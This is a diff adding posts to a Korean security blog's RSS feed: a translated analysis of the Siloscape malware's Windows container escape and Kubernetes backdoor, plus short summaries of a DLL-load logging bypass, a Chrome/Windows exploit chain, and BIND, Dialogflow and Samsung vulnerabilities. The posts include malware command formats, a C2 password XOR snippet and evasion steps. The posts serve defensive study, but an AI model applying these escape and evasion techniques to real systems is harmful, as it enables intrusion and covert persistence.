@@ -9,8 +9,311 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Sun, 13 Jun 2021 02:13:25 GMT</pubDate>
+    <pubDate>Sun, 20 Jun 2021 09:32:21 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[Translation] Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</title>
+      <link>https://hackyboiz.github.io/2021/06/20/idioth/siloscape/</link>
+      <guid>https://hackyboiz.github.io/2021/06/20/idioth/siloscape/</guid>
+      <pubDate>Sun, 20 Jun 2021 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;안녕하세요. idioth입니다. 원래 오늘은 ghidra의 다음 파트가 나오는 날이죠. 하지만 여러 가지 사정으로 인해 번역글을 작성하게 되었어요.&lt;/p&gt;
+&lt;p&gt;아직 저는 기말 시험이 끝나지 않았고 또 사무실에 있는 노트북에 분석한 VM이 잠들어</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p>안녕하세요. idioth입니다. 원래 오늘은 ghidra의 다음 파트가 나오는 날이죠. 하지만 여러 가지 사정으로 인해 번역글을 작성하게 되었어요.</p><p>아직 저는 기말 시험이 끝나지 않았고 또 사무실에 있는 노트북에 분석한 VM이 잠들어 있는데 어제 발에 레이저 치료를 받은 탓에 잘 걷지 못하고 있답니다 하하하. 생각보다 발 뒤꿈치로 걷는 거 할만해요 ^^….</p><p>아무튼 이런저런 이유로 기말 준비 중인 저에게 싸장님께서 읽으라고 추천해주신 글을 읽을 겸 번역해왔습니다! 후반부에 뺀 부분이 조금 있습니다! Siloscape의 행위를 보고 싶어서 IRC 접속 부분은 제외하고 번역을 했습니다. :)</p><blockquote><p>원문 글 : <a href="https://unit42.paloaltonetworks.com/siloscape/">Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</a></p></blockquote><h1 id="Executive-Summary"><a href="#Executive-Summary" class="headerlink" title="Executive Summary"></a>Executive Summary</h1><p>2021년 3월에 Windows container를 타깃으로 하는 최초의 악성코드를 발견했다. 지난 몇 년간 클라우드를 타깃으로 한 악성코드가 증가한 것을 생각하면 놀랍지는 않다. 이 악성코드는 container escape가 주목적이고 주로 server silo를 통해 Windows에서 구현되므로 Siloscape (silo escape처럼 들림 ㅎ)라고 이름 지었다.</p><p>Siloscape는 Windows container를 통해 Kubernetes clusters를 타깃으로 하는 악성코드이다. 주목적은 악성 컨테이너를 실행하기 위해 취약한 Kubernetes clusters에 백도어를 설치하는 것이다.</p><p>각 컨테이너는 하나의 클라우드 애플리케이션을 실행하는 반면에 하나의 클러스터는 여러 개의 클라우드 애플리케이션을 실행할 수 있으므로 개별 컨테이너를 손상시키는 것보다 전체 클러스터를 손상시키는 것이 더 치명적이다. 예시로 해커가 사용자 이름 및 암호, 조직의 기밀 정보와 내부 파일 또는 클러스텡 호스팅 된 전체 데이터베이스와 같은 중요 정보를 훔칠 수 있다. 해커가 랜섬웨어를 통해 조직의 파일을 인질로 잡을 수도 있다. 더 심각한 것은 많은 조직들이 클라우드로 이전하면서 개발, 테스트 환경으로 Kubernetes clusters를 많이 사용하고 있다. 이러한 점에서 광범위한 소프트웨어 공급망 공격이 발생할 수도 있다.</p><p>Siloscape는 C2 (Command and Cotrol) 서버에 익명으로 연결하기 위해 토르 프록시와 <code>.onion</code> 도메인을 사용한다. 23개(명?, 기관인지 사람인지 애매하네요)의 피해자를 찾았고 총 313명의 사용자를 호스팅 하는데 서버가 사용되고 있음을 발견했다. 이는 Siloscape가 캠페인의 빙산의 일각이라는 부분을 알려준다. 필자는 또한 이 캠페인이 1년 이상 지속되어 왔음을 발견했다.</p><p>이 리포트는 Windows container 취약점의 배경 지식, Siloscape의 기술 개요, Windows container 보안 권장 사항을 제공한다.</p><h1 id="Windows-Server-Container-취약점-개요"><a href="#Windows-Server-Container-취약점-개요" class="headerlink" title="Windows Server Container 취약점 개요"></a>Windows Server Container 취약점 개요</h1><p>2020년 7월 15에 <a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">Windows container boundaries에 관한 게시글</a>과 어떻게 우회할 수 있는지 작성했다. 이 게시글에서 컨테이너를 escape 하는 기술을 제공하고 해커가 escape 할 수 있는 위험이 있는 애플리케이션에 대해 이야기했다. 가장 중요한 애플리케이션은 Kubernetes의 Windows container node를 탈출하여 클러스터를 확산시키는 것이었다.</p><p>마이크로소프트에서 Windows Server container는 보안 기능이 아니라는 이유로 이 이슈를 취약점으로 생각하지 않았다. 따라서 컨테이너 내부에서 실행되는 각각의 애플리케이션은 호스트에서 직접 실행되는 것처럼 처리되어야 한다.</p><p>몇 주 후, Kubernetes가 이러한 이슈에 취약하다고 구글에 전달했다. 구글은 마이크로소프트에 전달하였고 마이크로소프트는 이 이슈를 Windows container에서 호스트로 escape 하는 것으로 결정하였지만 컨테이너에서 관리자 권한 없이 실행되면 취약점으로 간주된다.</p><p>그 후에 Windows Server container를 타깃으로 한 악성코드 Siloscape를 발견하였다. Siloscape는 Hyper-V가 아닌 Server Container를 사용하는 Kubernetes을 타깃으로 하는 난독화된 악성코드이며 주목적은 설정이 미흡한 Kubernetes 클러스터에 백도어를 열어 암호 화폐 채굴과 같은 악성 container를 실행하는 것이다.</p><p>악성코드의 동작과 기술에 대한 특징은 다음과 같다:</p><ul><li>알려진 취약점 (1-day)를 사용하여 타깃 클라우드 애플리케이션에 접근</li><li>Windows container escape를 통해 컨테이너를 escape 하고 underlying node에서 코드를 실행</li><li>node의 자격 증명을 통해 클러스터에 전파를 시도</li><li>토르 네트워크를 통해 IRC 프로토콜을 사용하여 C2 서버에 접속</li><li>추가 command 대기</li><li></li></ul><p>이 악성코드는 Kubernetes cluster의 컴퓨팅 리소스를 사용하여 암호화폐 채굴을 수행하고 손상된 클러스터에서 실행되는 수백 개의 애플리케이션의 중요 데이터를 가져올 수 있다.</p><p>C2 서버를 조사한 결과 이 악성코드는 큰 네트워크의 일부분이며 이 캠페인은 1년 이상 진행됐다. 게다가 캠페인의 특정 부분이 아직 활성화되어있다.</p><h1 id="기술-개요"><a href="#기술-개요" class="headerlink" title="기술 개요"></a>기술 개요</h1><p>Siloscape의 자세한 기술을 살펴보기 전에 전반적인 행위를 살펴보자.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled.png"></p><ol><li>해커는 1-day 취약점이나 웹페이지, 데이터베이스 취약점을 사용하여 Windows container 내부에 원격 코드 실행 (Remote Code Execution, RCE)을 수행</li><li>Siloscape (<code>CloudMalware.exe</code>)를 C2 접속 정보와 함께 command line으로 실행</li><li>Siloscape는 <code>SeTcbPrivilege</code> 권한을 얻기 위해 <code>CExecSvc.exe</code>를 impersonate (<a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">해당 게시글</a>에서 기술 상세 내용 확인 가능)</li><li>호스트에 global symbolic link를 생성하고 컨테이너화 된 X 드라이브를 호스트의 C 드라이브에 연결</li><li>global link를 사용하여 호스트에서 이름으로 <code>kubectl.exe</code>를 찾고 정규식으로 Kubernetes 설정 파일을 찾음</li><li>손상된 노드가 새로운 Kubernetes deployments를 생성할 수 있는 권한이 충분한지 확인</li><li>unzip을 사용해 압축 파일에서 토르 클라이언트를 디스크로 추출 (Siloscape의 main binary에 파일이 압축되어 있음)</li><li>토르 네트워크에 연결</li><li>command line argument를 통해 C2 서버의 비밀번호를 암호화</li><li><code>.onion</code> 도메인을 사용하여 C2 서버에 연결</li><li>C2 서버에서 오는 명령을 기다리고, 명령이 올 경우 실행</li></ol><p>컨테이너를 타깃으로 한 다른 암호화폐 채굴이 주 목적인 악성코드들과 다르게 Siloscape는 클러스터를 손상시키지 않는다. 대신에 탐지 및 추적을 방지하고 클러스터에 백도어를 설치하는 데에 집중했다.</p><h1 id="Defense-우회와-난독화"><a href="#Defense-우회와-난독화" class="headerlink" title="Defense 우회와 난독화"></a>Defense 우회와 난독화</h1><p>Siloscape는 심하게 난독화되어 있으며 대부분의 문자열을 읽을 수 없다. 난독화 로직은 어렵지 않지만 리버싱 하기 너무 힘들다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%201.png"></p><p>단순한 API 호출도 난독화 되어있으며 함수를 단순하게 호출하지 않고 Native API (NTAPI)를 사용하였다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%202.png"></p><p>예시로 <code>CreateFile</code>을 호출하는 대신에 <code>NtCreateFile</code>을 호출한다. <code>NtCreateFile</code>을 직접 호출하는 대신에 런타임에서 <code>ntdll.dll</code>에서 함수 이름을 찾아 주소로 점프하여 호출한다. 그뿐만 아니라 함수와 모듈 이름을 난독화하고 런타임에서 복호화한다. 정적 분석으로는 분석하기 어렵고 리버스 엔지니어링 하는데 힘든 악성코드이다.</p><p>Siloscape는 한 쌍의 key를 사용하여 C2 서버의 비밀번호를 복호화한다. 난독화 중에서 가장 중요한 특징은 키 하나는 바이너리에 하드 코딩되어 있는데, 하나는 command line argument에서 제공된다는 점이다. AutoFocus와 VirusTotal 같은 여러 엔진에서 hash를 검색해도 결과를 찾을 수 없었다. 이를 통해 Siloscape는 새로운 공격을 할 때 고유한 키를 사용해서 컴파일을 하는 것을 유추할 수 있다. 하드 코딩된 키는 바이너리들을 살짝씩 다르게 만들어서 hash를 통해 찾을 수 없음을 설명한다. 또 hash만으로 Siloscape를 탐지할 수 없다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%203.png"></p><p>다른 흥미로운 특징은 Visual Studio의 Resource Manager를 사용한 것이다. Visual Studio에 내장된 기능으로 어떤 파일이든 원본 바이너리에 추가할 수 있고 간단한 API 호출을 통해 포인터를 얻을 수 있다. Siloscape는 디스크에 토르 아카이브와 아카이브를 열기 위해 사용되는 unzip 바이너리를 이를 통해 추가했다. 또한 토르를 통해 C2 서버에 안전하게 접속한다.</p><h1 id="The-Container-Escape"><a href="#The-Container-Escape" class="headerlink" title="The Container Escape"></a>The Container Escape</h1><p>Siloscape의 흥미로운 점 중 하나는 컨테이너를 escape 하는 것이다. escape를 하기 위해 system call <code>NtSetInformationSymbolicLink</code>를 실행하려면 <code>SeTcbPrivilege</code> 권한을 얻어야 한다. 여기에는 몇 가지 방법이 있다. 예를 들어 권한을 가진 <code>CExecSvc.exe</code>에 DLL을 inject 하고 그 context에서 <code>NtSetInformationSymbolicLink</code>를 실행할 수 있다. 하지만 Siloscape는 기술 문서나 예시가 거의 없는 Thread Impersonation을 사용하였다. 이 기술의 주요한 함수는 문서화되지 않은 system call <code>NtImpersonateThread</code>이다.</p><p>Siloscape는 main thread를 impersonating 하여 <code>CExecSvc.exe</code>의 권한을 모방하고 컨테이너를 깨기 위해 새로 생성된 symbolic link에서 <code>NtSetInformationSymbolicLink</code>를 호출한다. 구체적으로 컨테이너화 된 X 드라이브를 호스트의 C 드라이브에 연결한다.</p><h1 id="클러스터-선택"><a href="#클러스터-선택" class="headerlink" title="클러스터 선택"></a>클러스터 선택</h1><p>호스트에 link를 생성한 뒤에 Kubernetes 노드에 존재하는 <code>kubectl.exe</code>와 Kubernetes 설정 파일을 찾는다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%204.png"></p><p>이름을 통해 <code>kubectl.exe</code>를 찾고 정규식을 사용해 Kubernetes 설정 파일을 찾는다. 검색하는 함수는 검색을 안 할 폴더 이름이 포함된 벡터의 포인터를 추가적인 인수로 사용한다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%205.png"></p><p>파일 검색을 위해 <code>FindFile</code>을 호출할 때 검색 속도를 빠르게 하기 위해 <code>Program Files</code>, <code>Program Files (x86)</code>, <code>Windows</code>, <code>Users</code> 폴더를 제외한다. (해당 폴더에 파일이 존재하지 않을 가능성이 높으므로) 두 파일을 모두 찾으면 전역 변수에 경로가 저장된다. 파일이 없으면 공격을 멈추고 siloscape가 종료된다.</p><p><code>kubectl</code>을 실행하는데 필요한 걸 모두 찾은 다음 <code>%ls auth can-i create deployments --kubeconfig=%ls</code> 명령어를 통해 손상된 노드가 악성 행위를 할 수 있는 권한이 있는지 확인한다. </p><h1 id="C2-연결-및-지원-명령어"><a href="#C2-연결-및-지원-명령어" class="headerlink" title="C2 연결 및 지원 명령어"></a>C2 연결 및 지원 명령어</h1><p>손상된 노드가 새로운 deployments를 생성할 수 있으면 호스트의 C 드라이브에 토르 아카이브와 unzip 바이너리를 추출한다. 토르를 추출한 후 <code>tor.exe</code>를 새 스레드로 시작하고 토르 스레드의 output을 확인할 때까지 대기한다.</p><p>토르가 실행되면 <code>.onion</code> 도메인을 통해 IRC 서버인 C2에 연결한다.</p><p>서버는 비밀번호로 보호되고 있고 command line argument와 바이트 XOR을 통해 복호화한다. C2 서버의 복호화 로직을 간단하게 표현하면 다음과 같다.</p><pre><code class="hljs angelscript">char hardCodedXor[<span class="hljs-number">32</span>] = <span class="hljs-string">&quot;HARD_CODED_32_LONG_STRING&quot;</span>;char ircPass[<span class="hljs-number">32</span>] = &#123; <span class="hljs-number">0</span> &#125;;<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)     ircPass[i] = hardCodedXor[i] ^ argv[<span class="hljs-number">1</span>][i];</code></pre><p>IRC 서버에 연결이 성공하면 <code>JOIN #WindowsKubernetes</code> 명령어를 사용하여 <code>WindowsKubernetes</code> IRC 채널에 들어간 후 대기한다.</p><p>Siloscape는 kubectl 지원 명령과 Windows <code>cmd</code> 명령 두 가지 유형의 명령이 있다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%206.png"></p><p>명령을 <code>admin</code> 사용자가 받으면 다음 로직을 따른다.</p><ul><li>메시지가 <code>K</code>로 시작하면 <code>%ls %s --kubeconfig=%ls</code> 명령을 실행하여 위에서 찾은 경로로 클러스터에 kubectl 명령 실행<ul><li>첫 번째 파라미터 : 전역 변수의 kubectl의 경로</li><li>두 번째 파라미터 : 첫번째 문자를 제외한 admin으로의 메시지</li><li>세 번째 파라미터 : 전역 변수의 설정 파일 경로</li></ul></li><li>메시지가 <code>C</code>로 시작하면 첫 번째 문자를 빼고 Windows cmd 명령을 실행</li></ul><h1 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h1><p>리소스 하이재킹이나 DoS를 목적으로 한 대부분의 클라우드 악성코드와 달리 Siloscape는 하나의 목적에만 국한되지 않고 다양한 악성 행위를 수행하기 위해 백도어를 설치한다.</p><p><a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">필자의 지난 게시글</a>에서 얘기했듯 마이크로소프트는 보안 기능으로 Windows container를 사용하지 말라고 했다. 마이크로소프트는 security boundary를 컨테이너화에 의존하지 말고 Hyper-V 컨테이너를 사용하는 걸 추천한다. Windows Server container에서 실행되는 모든 프로세스는 호스트의 관리자 권한을 가진 것으로 생각해야 하며 이번 경우에는 Kubernetes node였다. 보안이 필요한 Windows Server container에서 애플리케이션을 실행하는 경우 Hyper-V 컨테이너에서 실행하는 게 좋다.</p><p>게다가 관리자는 Kubernetes cluster를 안전하게 설정해야 한다. secured Kubernetes node의 권한은 해당 악성코드가 실행될 만큼의 충분한 권한이 없어서 Siloscape에 영향을 받지 않는다.</p><p>Siloscape는 container escape를 하지 못하면 피해를 유발하지 않는다는 점에서 컨테이너 보안의 중요성을 보여준다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/cloud/">cloud</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/containers/">containers</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/kubernetes/">kubernetes</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/siloscape/">siloscape</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/20/idioth/siloscape/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Bypassing Image Load Kernel Callbacks</title>
+      <link>https://hackyboiz.github.io/2021/06/20/j0ker/2021-06-20/</link>
+      <guid>https://hackyboiz.github.io/2021/06/20/j0ker/2021-06-20/</guid>
+      <pubDate>Sun, 20 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;프로그램에서 LoadLibrary 함수를 통해 DLL 파일을 로드하면 커널에서 등록한 Callback 함수에 의해 이벤트 로그에 해당 DLL이 로드되었다는 내용가 기록됩니다. LoadLibrary 함수를 분석해보면, 해당 이벤트는 내부 구조체들이</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p>프로그램에서 LoadLibrary 함수를 통해 DLL 파일을 로드하면 커널에서 등록한 Callback 함수에 의해 이벤트 로그에 해당 DLL이 로드되었다는 내용가 기록됩니다. LoadLibrary 함수를 분석해보면, 해당 이벤트는 내부 구조체들이 링크되는 과정이나 코드가 실행될 때 발생하는 것이 아니라 메모리에 할당하고 이를 셋업하는 과정에서 NtMapViewOfSection 함수에 의해 발생하는 것을 알 수 있습니다. 실제 LoadLibrary 함수를 똑같이 구현하되 NtMapViewOfSection 함수까지의 과정만 구현하고 실행할 경우, DLL이 로드되었다는 이벤트만 발생할 뿐, 실제로 DLL이 로드되지는 않습니다.</p><p>Dylan은 커널의 Callback 함수 호출을 우회하여 이벤트 로그의 발생 없이 DLL을 로드하는 방법과 이를 구현한 <a href="https://github.com/bats3c/DarkLoadLibrary">DarkLoadLibrary 소스코드</a>를 공개했습니다. 동작 과정은 아래와 같습니다.</p><ol><li>정상적인 PE 포맷을 가지고 있는지 확인</li><li>헤더와 섹션 데이터를 메모리에 복사 후 메모리 권한 설정</li><li>(필요하다면) 이미지 베이스 조정</li><li>import table과 delayed import table 세팅</li><li>TLS callback 실행</li><li>exception handler 등록</li><li>DllMain(Entry Point) 호출</li></ol><p>Dylan은 이 기법을 통해 악성코드가 어떤 DLL을 로드했는지에 대한 로그를 숨길 수 있고 이 기법이 Reflective DLL Injection을 대체할 것으로 예상하고 있다고 밝혔습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/J0ker/">J0ker</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/loadimage/">loadimage</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/event/">event</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/darkloadlibrary/">darkloadlibrary</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/callback/">callback</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/20/j0ker/2021-06-20/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] PuzzleMaker: 실제 공격에 사용된 Exploit chain</title>
+      <link>https://hackyboiz.github.io/2021/06/19/fabu1ous/2021-06-19/</link>
+      <guid>https://hackyboiz.github.io/2021/06/19/fabu1ous/2021-06-19/</guid>
+      <pubDate>Sat, 19 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securelist.com/puzzlemaker-chrome-zero-day-exploi</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">PuzzleMaker attacks with Chrome zero-day exploit chain</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt;= 90.0.4430.85</p><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>최근 여러 기업에 대한 고도로 표적화된 공격이 감지되었습니다. Kaspersky technologies의 분석에 따르면 해당 공격들은 구글 Chrome(CVE-2021-21224)과 Windows(CVE-2021-31955, CVE-2021-31956) 제로데이 Exploit chain을 사용합니다.</p><ul><li><p>CVE-2021-21224</p><p>90.0.4430.85이전 Chrome의 V8에는 Type confusion 취약점이 존재해 해커로 하여금 악성 HTML 페이지를 통해 원격으로 임의 코드 실행을 할 수 있게 합니다.</p></li><li><p>CVE-2021-31955</p><p>ntoskrnl.exe에 존재하는 정보 노출 취약점입니다. Windows OS의 SuperFetch 기능을 악용한 것으로 <code>NtQuerySystemInformation</code>함수에 의해 반환된 SuperFetch 정보 클래스에 EPROCESS 커널 주소를 포함하기 때문에 발생합니다.</p></li><li><p>CVE-2021-3195</p><p>ntfs.sys에 존재하는 heap-based buffer overflow취약점입니다.<code> NTFSQUeryEaUserEaList</code>는 파일에 대한 확장 attribute 목록을 처리하고 버퍼에 저장합니다. 해당 기능은 output 버퍼의 크기를 제어할 수 있고 32비트 alignment로 정렬합니다. Output 버퍼의 패딩 기능에 integer underflow 검사가 없어서 Heap overflow가 발생합니다.</p></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/19/fabu1ous/2021-06-19/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] ISC BIND 서버의 정보 유출 취약점</title>
+      <link>https://hackyboiz.github.io/2021/06/18/l0ch/2021-06-18/</link>
+      <guid>https://hackyboiz.github.io/2021/06/18/l0ch/2021-06-18/</guid>
+      <pubDate>Fri, 18 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/6/15/zdi-21-5</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/15/zdi-21-502-an-information-disclosure-bug-in-isc-bind-server">ZDI-21-502: AN INFORMATION DISCLOSURE BUG IN ISC BIND SERVER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>BIND 9.11.31, 9.16.15 이전 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ISC사의 DNS 서버 소프트웨어인 BIND에서 발견된 정보 유출 취약점의 세부 정보가 공개되었습니다.</p><p><code>der_match_tag_and_length()</code> 함수는 태그를 매칭하고 네트워크 패킷에서 길이와 같은 필드를 파싱하는 함수로, 취약점이 발생하는 코드는 아래와 같습니다.</p><pre><code class="hljs jsx"><span class="hljs-keyword">static</span> int der_match_tag_and_length(<span class="hljs-keyword">const</span> unsigned char *p, size_t len, Der_class xclass,                 Der_type type, int tag, size_t *length_ret,  size_t *size) &#123;     size_t l, ret = <span class="hljs-number">0</span>;     int e;      e = der_match_tag(p, len, xclass, type, tag, &amp;l);     <span class="hljs-keyword">if</span> (e) &#123;         <span class="hljs-keyword">return</span> (e);     &#125;     p += l;     len -= l;     ret += l;     e = der_get_length(p, len, length_ret, &amp;l);  <span class="hljs-comment">// (1) </span>    <span class="hljs-keyword">if</span> (e) &#123;         <span class="hljs-keyword">return</span> (e);     &#125; ...&#125;</code></pre><p>해당 함수에서 호출하는 <code>der_get_length()</code> 함수의 인자 중 <code>length_ret</code>은 호출자에서 값에 대한 검증이 이뤄져야 하지만 해당 함수에서는 검증을 하지 않고 반환합니다. <code>der_match_tag_and_length()</code> 함수에서 반환된 검증되지 않은 길이 값은 이후 <a href="https://datatracker.ietf.org/doc/html/rfc4178#section-4.2.1">negTokenInit</a>을 디코딩하는 <code>decode_NegTokenInit()</code> 함수 내의 여러 검사에 사용되어 OOB Access로 이어질 수 있습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/out-of-bounds/">out-of-bounds</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/18/l0ch/2021-06-18/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] dialogflow.cloud.google.com 권한 상승 취약점</title>
+      <link>https://hackyboiz.github.io/2021/06/17/idioth/2021-06-17/</link>
+      <guid>https://hackyboiz.github.io/2021/06/17/idioth/2021-06-17/</guid>
+      <pubDate>Thu, 17 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://lalka-test.medium.com/google-vrp-privilege-escala</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://lalka-test.medium.com/google-vrp-privilege-escalation-on-https-dialogflow-cloud-google-com-599af6c4516d">[Google VRP] Privilege escalation on https://dialogflow.cloud.google.com)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://dialogflow.cloud.google.com/">https://dialogflow.cloud.google.com/</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Cloud Platform의 Dialogflow 콘솔 사이트 <a href="https://dialogflow.cloud.google.com에서/">https://dialogflow.cloud.google.com에서</a> 권한 상승이 발견되었습니다. 해당 취약점은 초대된 다른 사용자의 권한을 낮춰도 동작하지 않아 발생하였습니다. 취약점을 트리거하는 단계는 다음과 같습니다.</p><ol><li><a href="https://dialogflow.cloud.google.com/#/editAgent/{project}/">https://dialogflow.cloud.google.com/#/editAgent/{project}/</a> 설정으로 이동하여 “Developer” 권한을 가진 사용자를 초대합니다.</li><li>“Developer”를 “Reviewer”로 권한을 낮춥니다.</li><li>설정이 적용되어 Reviewer로 화면에는 표시되지만 사용자는 Developer 권한으로 모든 작업이 가능합니다.</li></ol><p><a href="https://console.cloud.google.com/iam-admin/%EC%97%90%EC%84%9C">https://console.cloud.google.com/iam-admin/에서</a> 확인하면 초대된 사용자의 권한이 처음에 Developer로 설정한 후 Reviewer로 수정하면 권한이 수정되지 않고 Developer + Reviewer의 권한이 적용되어 발생한 취약점입니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/gcp/">gcp</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/17/idioth/2021-06-17/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Samsung mobile 기본 앱 취약점</title>
+      <link>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/</link>
+      <guid>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/</guid>
+      <pubDate>Wed, 16 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.oversecured.com/Two-weeks-of-securing-Samsun</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/">Two weeks of securing Samsung devices: Part 1</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Samsung mobile 기본 앱</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Oversecured 팀이 삼성 모바일 기기에 기본 제공되는 앱에서 다수의 취약점을 발견했습니다. 해커는 해당 취약점들을 악용해 타겟 기기의 연락처, 통화, SMS/MMS에 접근하여 편집하고 관리자 권한으로 임의의 앱을 설치할 수 있습니다.</p><ul><li><p>CVE-2021-25388</p><p>Knox Core는 URI 파라미터 검증이 미흡해 해커가 임의의 앱을 설치하거나 임의의 파일을 탈취할 수 있습니다. </p></li><li><p>CVE-2021-25356</p><p>Managed Provisioning은 모든 상호작용의 승인을 확인하기 위한 보안 검사가 있습니다. 하지만 <code>com.samsung.knox.container.requestId</code>값이 설정되어있다면 이를 